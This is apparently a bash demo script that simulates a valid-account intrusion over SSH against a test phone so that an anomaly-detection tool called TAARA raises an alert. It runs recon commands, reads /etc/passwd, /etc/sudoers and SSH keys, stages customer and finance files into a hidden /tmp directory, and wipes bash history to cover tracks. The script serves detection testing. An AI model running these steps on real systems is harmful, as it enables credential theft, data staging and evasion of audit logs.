#!/bin/bash
# ──────────────────────────────────────────────────────────────────────────────
# TAARA Demo — ZeroTier Attacker Script
# Scenario: T1078 Valid-Account Attack
# Each command is written to ~/.bash_history on the target before execution
# so TaaraWare's 3s history poller catches it within the 30s window.
# ──────────────────────────────────────────────────────────────────────────────

TARGET="10.248.248.67"
PORT="8022"
USER="u0_a134"
PASS="demo1234"

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; NC='\033[0m'; BOLD='\033[1m'

# Run a command on target AND write it to bash_history first
runcmd() {
    local cmd="$1"
    # Write to history first, then run — TaaraWare history poller will catch it
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p $PORT $USER@$TARGET \
        "echo '$cmd' >> ~/.bash_history; $cmd" 2>/dev/null
}

echo -e "${BOLD}=== TAARA ZeroTier Demo — Attack Simulation ===${NC}"
echo -e "Target  : ${RED}$TARGET:$PORT${NC} (phone over ZeroTier)"
echo -e "Duration: ~120s — covers 4 TaaraWare poll cycles"
echo ""
echo -e "${YELLOW}[!] Classical IDS: valid credentials, normal commands — NOTHING FLAGGED${NC}"
echo -e "${GREEN}[+] TAARA: behavioral DNA deviating — quantum alert incoming${NC}"
echo ""

ATTACK_START=$(date +%s)

# ── Phase 1: Hardware enumeration (hardware_enum_count spike) ─────────────────
echo -e "${BOLD}[Phase 1 — t=0s] Hardware enumeration${NC}"
runcmd "uname -a"
runcmd "free -h"
runcmd "uptime"
runcmd "df -h"
runcmd "nproc"
runcmd "w"
runcmd "lscpu"
sleep 1

# ── Phase 2: Sensitive path access ───────────────────────────────────────────
echo -e "${BOLD}[Phase 2 — t=~10s] Sensitive data access${NC}"
runcmd "ls -la ~/.ssh/"
runcmd "cat ~/.ssh/authorized_keys"
runcmd "cat /etc/passwd"
runcmd "find /etc -name shadow"
sleep 1

# ── Phase 3: File enumeration + company data ──────────────────────────────────
echo -e "${BOLD}[Phase 3 — t=~20s] File enumeration${NC}"
runcmd "find ~ -type f"
runcmd "cat ~/company_data/customers/customer_db.csv"
runcmd "cat ~/company_data/finance/q1_revenue.txt"
runcmd "cat ~/company_data/config/app_config.json"
sleep 1

# ── Phase 4: Malware pattern commands ────────────────────────────────────────
echo -e "${BOLD}[Phase 4 — t=~30s] Malware execution pattern${NC}"
runcmd "wget --version"
runcmd "curl --version"
runcmd "chmod 755 ~/company_data/config/app_config.json"
runcmd "nohup ls /tmp"
runcmd "nc -h"
sleep 1

# ── Phase 5: Data staging ─────────────────────────────────────────────────────
echo -e "${BOLD}[Phase 5 — t=~40s] Data staging${NC}"
runcmd "mkdir -p /tmp/.stage"
runcmd "cp ~/company_data/customers/customer_db.csv /tmp/.stage/"
runcmd "cp ~/company_data/finance/q1_revenue.txt /tmp/.stage/"
runcmd "tar -czf /tmp/.stage/bundle.tar.gz /tmp/.stage/"
sleep 1

# ── Phase 6: Network probe ────────────────────────────────────────────────────
echo -e "${BOLD}[Phase 6 — t=~50s] Network probe${NC}"
runcmd "ss -tn"
runcmd "curl -s http://10.248.248.59 --max-time 2"
runcmd "wget -q http://10.248.248.59 -O /dev/null --timeout=2"
sleep 1

# ── Phase 7: Privilege probe ──────────────────────────────────────────────────
echo -e "${BOLD}[Phase 7 — t=~60s] Privilege escalation probe${NC}"
runcmd "sudo -l"
runcmd "id"
runcmd "groups"
runcmd "cat /etc/sudoers"
sleep 1

# ── Sustain: keep signals elevated across 2 more poll cycles ──────────────────
echo -e "${BOLD}[Sustain — t=~70s] Maintaining signals across poll cycles…${NC}"
echo -e "${YELLOW}(repeating recon every 25s so TaaraWare catches it in 2+ cycles)${NC}"

for CYCLE in 1 2; do
    ELAPSED=$(( $(date +%s) - ATTACK_START ))
    echo -e "  ${YELLOW}[Cycle $CYCLE — t=${ELAPSED}s]${NC} Re-running attack commands…"
    runcmd "uname -a"
    runcmd "free -h"
    runcmd "df -h"
    runcmd "uptime"
    runcmd "w"
    runcmd "cat ~/.ssh/authorized_keys"
    runcmd "cat /etc/passwd"
    runcmd "wget --version"
    runcmd "curl --version"
    runcmd "chmod 644 /tmp/.stage/bundle.tar.gz"
    runcmd "find ~ -name '*.json'"
    runcmd "cat ~/company_data/customers/customer_db.csv"
    runcmd "ss -tn"
    runcmd "sudo -l"
    echo "  Waiting 25s for next TaaraWare poll cycle…"
    sleep 25
done

# ── Phase 8: Cover tracks + wipe history so next training sees clean baseline ─
ELAPSED=$(( $(date +%s) - ATTACK_START ))
echo -e "${BOLD}[Phase 8 — t=${ELAPSED}s] Cover tracks${NC}"
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p $PORT $USER@$TARGET \
    "rm -rf /tmp/.stage/ 2>/dev/null; > ~/.bash_history; echo 'Tracks covered.'" 2>/dev/null

TOTAL=$(( $(date +%s) - ATTACK_START ))
echo ""
echo -e "${RED}${BOLD}=== Attack complete (${TOTAL}s total) ===${NC}"
echo -e "TAARA should now show:"
echo -e "  ${RED}Q CONFIDENCE > threshold${NC}"
echo -e "  ${RED}SWAP FIDELITY low${NC}     (latent far from normal subspace)"
echo -e "  ${RED}DIRECTIONALITY high${NC}   (moving into anomalous subspace)"
echo -e "  ${RED}ALERT: T1078 VALID ACCOUNT ABUSE${NC}"
echo ""
echo -e "Classical IDS logged: ${GREEN}NOTHING${NC} — valid auth, valid commands, no signatures"
